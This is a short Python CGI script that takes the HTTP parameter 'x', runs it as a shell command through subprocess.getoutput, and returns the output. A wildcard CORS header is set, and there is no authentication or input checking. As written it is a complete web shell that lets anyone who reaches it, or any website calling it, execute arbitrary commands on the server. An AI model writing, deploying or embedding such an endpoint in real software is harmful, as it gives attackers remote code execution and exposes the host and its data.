
#!/usr/bin/python3

print("content-type: text/html")
print("Access-Control-Allow-Origin: *")
print()

import subprocess
import cgi
form = cgi.FieldStorage()
cmd = form.getvalue("x")
x = subprocess.getoutput(cmd)
print(x)
